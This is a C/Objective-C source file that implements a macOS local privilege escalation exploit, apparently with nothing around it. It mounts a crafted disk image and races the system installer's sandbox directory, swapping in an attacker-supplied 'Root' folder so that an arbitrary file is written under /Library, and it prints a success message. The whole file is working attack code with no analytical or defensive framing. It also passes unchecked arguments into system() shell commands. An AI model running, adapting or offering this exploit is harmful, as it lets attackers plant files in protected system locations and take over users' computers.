#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <dirent.h>
#include <libgen.h>

#define MOUNT_DIR "/tmp/.exploit"

void prepare(const char *src, const char *dst) {
    if (strncmp(dst, "/Library", 8)) {
        printf("[!] dst path must be start with '/Library' (sorry for the hardcode).\n");
        exit(-1);
    }
    
    printf("[*] preparing the dmg mounting...\n");
    mkdir(MOUNT_DIR, 0777);
    system("hdiutil create -size 10m -volname .exploit -ov disk.dmg");
    system("hdiutil attach disk.dmg -mountpoint "MOUNT_DIR);
    
    printf("[*] preparing the payload...\n");
    char cmd[MAXPATHLEN] = {0};
    snprintf(cmd, MAXPATHLEN, "mkdir -p "MOUNT_DIR"/Root%s", dirname(strdup(dst)));
    system(cmd);
    snprintf(cmd, MAXPATHLEN, "cp %s "MOUNT_DIR"/Root%s", src, dst);
    system(cmd);
    
    symlink("/Library", MOUNT_DIR"/Library");
    printf("[*] all the preparations are done.\n");
}

void cleanup(void) {
    unlink("disk.dmg");
    system("rm -rf "MOUNT_DIR);
}

// the payload to be shoved from the path:
// $MOUNT_DIR/.PKInstallSandboxManager-SystemSoftware/2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox/Root

void fire_the_hole(void) {
    DIR *dp = NULL;
    struct dirent *ep = NULL;
    char *sandbox = NULL;
    char path[MAXPATHLEN] = {0};
    
    while (1) {
        dp = opendir(MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware");
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 0x32) { //strlen("2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox")==0x32
                sandbox = ep->d_name;
                printf("[*] Got Sandbox:%s.\n", sandbox);
                goto NEXT1;
            }
        }
        closedir (dp);
    }
NEXT1:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/Root", sandbox);
    while (-1 == access(path, R_OK)) {
        //printf("[*] try to access: %s, errno:%d, waiting...\n", path, errno);
    }
    
    if (0 != rename(MOUNT_DIR"/Root", path)) {
        printf("[!] failed to move our payload to path:%s, errno=%d\n", path, errno);
        exit(-1);
    }
    
    printf("[*] exploit successfully :D\n");
}

int main(int argc, const char * argv[]) {
    if (argc != 3) {
        printf("Usage: %s /path/to/src /Library/*/dst\n", argv[0]);
    }
    
    prepare(argv[1], argv[2]);
    
    fire_the_hole();
    
    return 0;
}
